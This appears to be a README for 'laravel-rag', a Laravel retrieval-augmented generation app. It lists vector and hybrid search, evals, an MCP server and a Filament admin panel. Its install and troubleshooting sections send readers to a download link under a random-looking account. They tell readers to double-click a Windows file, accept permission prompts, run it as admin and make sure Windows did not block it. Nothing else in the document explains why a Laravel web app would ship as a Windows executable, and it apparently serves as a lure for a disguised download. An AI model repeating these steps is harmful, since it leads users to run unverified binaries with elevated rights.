# 🧠 laravel-rag - Run local RAG with ease

[⬇️ Download laravel-rag](https://github.com/cannedfoodssunbonnet729/laravel-rag){:style="display:inline-block;padding:12px 18px;background:#6c5ce7;color:#fff;text-decoration:none;border-radius:8px;font-weight:700;"}

## 📥 Download

Use this link to visit the download page:
https://github.com/cannedfoodssunbonnet729/laravel-rag

Download the app for Windows from that page, then keep the file in a folder you can find, such as Downloads or Desktop.

## 🖥️ What laravel-rag does

laravel-rag is a Laravel app for retrieval-augmented generation, also called RAG. It helps you work with your own files and data, then search them with AI support.

It includes:

- Vector search with pgvector and sqlite-vec
- Streaming responses
- Agentic retrieval
- Hybrid search
- Evaluation tools
- MCP server support
- Filament admin

This setup is useful when you want fast search across notes, docs, or project data without sorting through files by hand.

## ✅ What you need

Before you start, make sure your Windows PC has:

- Windows 10 or Windows 11
- An internet connection
- Enough free disk space for the app and your data
- A modern browser such as Chrome, Edge, or Firefox
- Permission to run downloaded files

If the app uses a local database, it can work with SQLite for simple setup or PostgreSQL with pgvector for larger use.

## 🚀 Install on Windows

1. Open the download page:
   https://github.com/cannedfoodssunbonnet729/laravel-rag

2. Download the Windows file from that page.

3. Open the folder where the file was saved.

4. Double-click the file to start it.

5. If Windows asks for permission, choose **Yes**.

6. Follow the setup steps on screen.

7. Wait for the app to finish starting.

8. Open your browser if the app does not open by itself.

9. Use the local address shown by the app.

## 🧭 First-time setup

When the app starts for the first time, you may need to set a few items:

- Choose your data source
- Pick SQLite or PostgreSQL
- Add your API key if the app needs one for AI features
- Load the documents or files you want to search
- Save your settings before you close the page

If you use SQLite, setup is usually simpler. If you use PostgreSQL with pgvector, you may need an existing database.

## 🔎 How to use it

After setup, the usual flow is:

1. Add files or content to the app
2. Let the app build embeddings and indexes
3. Ask a question in the search or chat area
4. Read the answer and source matches
5. Use the admin panel to check jobs, data, or settings

For best results, use clear document names and keep related files together.

## 🧩 Search modes

laravel-rag supports more than one search style:

- **Vector search**: Finds related content by meaning
- **Hybrid search**: Combines keyword and vector search
- **Agentic retrieval**: Breaks a query into smaller steps
- **Streaming output**: Shows answers as they are generated

These modes help when your data has mixed file types or when a plain search is not enough.

## 🗃️ Storage options

You can use one of these storage paths:

- **SQLite with sqlite-vec** for local use and simple setup
- **PostgreSQL with pgvector** for larger data sets and shared use

Choose SQLite if you want the easiest start on one Windows machine. Choose PostgreSQL if you already use a server and want more control.

## 🛠️ Admin panel

The Filament admin panel gives you a place to manage the app. You can use it to:

- Check stored content
- Review indexing jobs
- Update settings
- View search or evaluation data
- Keep track of app state

This helps when you want a clearer view of what the app has indexed.

## 📈 Evals

laravel-rag includes eval tools so you can test search quality. This helps you see if answers match your data well.

Use evals to:

- Check if the right source is found
- Compare search methods
- Spot weak queries
- Improve the data you load

## 🔌 MCP server

The app can act as an MCP server. That lets other tools connect to it in a structured way.

This is useful if you want to:

- Connect the app to other AI tools
- Reuse your RAG data in more than one place
- Keep your retrieval setup in one system

## 🧼 Common issues

If the app does not start:

- Make sure you downloaded the correct Windows file
- Check that the file finished downloading
- Try running it again as an admin
- Make sure Windows did not block the file
- Confirm your browser can open local pages

If search does not return useful results:

- Add more content
- Use cleaner source files
- Rebuild the index
- Try hybrid search
- Check that the right storage backend is selected

If you use PostgreSQL and it fails to connect:

- Check the database name
- Check the host, user, and password
- Confirm pgvector is enabled
- Try SQLite first if you want a simpler path

## 📁 Suggested folder setup

Keep your files in a simple structure like this:

- `laravel-rag` for the app
- `documents` for source files
- `exports` for saved output
- `logs` for app logs

A clean folder layout makes it easier to find your data later.

## 🧠 Good ways to use it

You can use laravel-rag for:

- Internal docs search
- Help desk content
- Notes and knowledge bases
- Project files
- Local AI search on Windows

If you want to ask questions from your own data, this app gives you a direct path for that task.